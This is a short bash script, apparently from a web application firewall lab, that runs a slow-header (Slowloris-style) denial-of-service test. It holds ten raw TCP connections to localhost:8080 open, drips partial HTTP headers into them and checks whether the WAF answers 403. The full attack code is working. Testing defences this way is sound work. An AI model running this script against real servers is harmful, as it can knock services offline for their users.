#!/bin/bash

echo "=========================================="
echo "Slow DDoS Attack Test (Enhanced Logging)"
echo "=========================================="
echo ""

TARGET_HOST="localhost"
TARGET_PORT=8080
TARGET_PATH="/"
CONNECTIONS=10
HEADER_DELAY=2
KEEP_ALIVE_DURATION=15
READ_TIMEOUT=5

echo "[*] Target: http://${TARGET_HOST}:${TARGET_PORT}${TARGET_PATH}"
echo "[*] Connections: ${CONNECTIONS}"
echo ""

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

function slow_connection() {
    local id="$1"

    exec 3<>"/dev/tcp/${TARGET_HOST}/${TARGET_PORT}" 2>/dev/null
    if [ $? -ne 0 ]; then
        echo -e "[${id}] ${RED}✘ CONNECTION FAILED${NC}"
        return
    fi

    echo "[${id}] [+] Connected"

    # Send partial headers slowly
    printf "GET %s HTTP/1.1\r\n" "$TARGET_PATH" >&3
    sleep ${HEADER_DELAY}

    printf "Host: %s\r\n" "$TARGET_HOST" >&3
    sleep ${HEADER_DELAY}

    printf "User-Agent: slow-ddos/1.0\r\n" >&3

    for header_index in $(seq 1 5); do
        printf "X-Test-%02d: %s\r\n" "$header_index" "$(date +%s)" >&3
        sleep ${HEADER_DELAY}
    done

    echo "[${id}] [~] Holding connection..."

    # Try to read response (detect WAF)
    RESPONSE=$(timeout ${READ_TIMEOUT} cat <&3 2>/dev/null)

    if echo "$RESPONSE" | grep -q "403"; then
        echo -e "[${id}] ${GREEN}[✔] BLOCKED (HTTP 403)${NC}"
    elif [ -z "$RESPONSE" ]; then
        echo -e "[${id}] ${YELLOW}[!] NO RESPONSE (possible timeout / slow handling)${NC}"
    else
        STATUS=$(echo "$RESPONSE" | head -n 1)
        echo -e "[${id}] ${RED}[✘] ALLOWED → ${STATUS}${NC}"
    fi

    sleep ${KEEP_ALIVE_DURATION}

    exec 3<&-
    exec 3>&-

    echo "[${id}] [-] Closed"
}

# Run attack
for i in $(seq 1 ${CONNECTIONS}); do
    slow_connection "${i}" &
done

wait

echo ""
echo "[*] Check logs:"
echo "    docker logs waf-lab-waf"
echo "    logs/audit.log"